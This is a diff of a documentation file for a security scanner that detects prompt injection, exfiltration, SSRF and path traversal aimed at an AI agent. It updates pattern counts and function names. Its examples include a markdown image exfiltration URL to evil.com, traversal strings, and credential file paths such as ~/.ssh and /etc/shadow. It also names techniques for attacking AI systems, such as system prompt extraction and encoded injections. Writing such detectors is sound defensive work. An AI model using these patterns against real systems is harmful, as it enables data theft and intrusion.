@@ -6,15 +6,15 @@ globs: ["src/**/*.ts", "snippets/security-scanner.ts"]
 # Security Scanner Patterns
 
 ## Summary (verifiziert 28.03.2026, Session E)
-- **130+ Detection Patterns**: 37 injection + 15 exec + 6 write + 22 sensitive data + 11 base64 keywords + 4 system prompt extraction + Typoglycemia defense, Hex decoding, HTML exfiltration, ROT13, Markdown exfiltration, SSRF, Path traversal, Rate anomaly, Output monitoring
-- **14 Detection Categories**: injection, exfiltration, tool-abuse, phishing, rate-anomaly, markdown-exfil, ssrf, path-traversal, base64, hex, typoglycemia, html-exfil, rot13, system-prompt-extraction
-- **341 Tests** (5 test files), **60 Attack Corpus Cases**
+- **130+ Detection Patterns** (142 total primitives): 50 injection + 15 exec + 6 write + 22 sensitive data + 11 base64/hex/rot13 keywords + 18 typoglycemia targets + 2 markdown exfil + 8 SSRF + 7 path traversal + 3 HTML exfil
+- **14 Detection Techniques** (conceptual), **9 ScanCategory values** in code: injection, exfiltration, tool-abuse, phishing, rate-anomaly, markdown-exfil, ssrf, path-traversal, none
+- **340 Tests** (5 test files), **60 Attack Corpus Cases**
 - **4 Hooks, 2 Tools, 4 Routes**
 - **Severity Centralization**: `calcSeverity()` unified severity logic across all scan functions
 - **DoS-Schutz**: MAX_SCAN_LENGTH = 1MB (Inputs >1MB werden uebersprungen)
 - **ReDoS-Schutz**: Alle Regex verwenden lazy `[^\n]*?` statt greedy `.*`
 - **Glob-Escaping**: `escapeRegExp()` vor Glob→Regex Konvertierung in allowedExecPatterns
-- **CSP**: Nonce-based (no unsafe-inline for scripts), 5 Security Headers (CSP, X-Content-Type-Options, X-Frame-Options, Referrer-Policy, Connection/Cache-Control for SSE)
+- **4 Security Headers**: CSP (unsafe-inline for Tailwind CDN compatibility, frame-ancestors 'none', base-uri 'self', object-src 'none'), X-Content-Type-Options (nosniff), X-Frame-Options (DENY), Referrer-Policy (strict-origin-when-cross-origin)
 
 ## Detection Categories
 
@@ -105,7 +105,7 @@ globs: ["src/**/*.ts", "snippets/security-scanner.ts"]
 - Decodes ROT13-encoded text and scans against OBFUSCATION_KEYWORDS
 - Detects mixed ROT13 segments embedded in normal text
 - Complements base64 and hex decoding for full obfuscation coverage
-- Category: "rot13" in audit log
+- Category: "injection" in audit log (called via scanForInjection)
 
 ### 13. Markdown Exfiltration Detection (scanForMarkdownExfiltration)
 - Markdown image syntax with external URLs: `![alt](http://evil.com/steal?data=...)`
@@ -123,7 +123,7 @@ globs: ["src/**/*.ts", "snippets/security-scanner.ts"]
 - Integrated in before_tool_call for URL parameter scanning
 - Category: "ssrf" in audit log
 
-### 15. Path Traversal Detection (checkPathTraversal)
+### 15. Path Traversal Detection (scanForPathTraversal)
 - Directory traversal: ../, ..\, %2e%2e%2f, %2e%2e/
 - Sensitive file access: /etc/passwd, /etc/shadow, /proc/self
 - Home directory access: ~/.ssh, ~/.aws, ~/.env
@@ -144,7 +144,7 @@ Base levels by function:
 - scanForHtmlExfiltration: medium
 - scanForMarkdownExfiltration: medium
 - checkSsrfPatterns: high
-- checkPathTraversal: high
+- scanForPathTraversal: high
 - checkRot13Injections: medium
 
 ## Post-Read Scanning (BitGN Pattern)
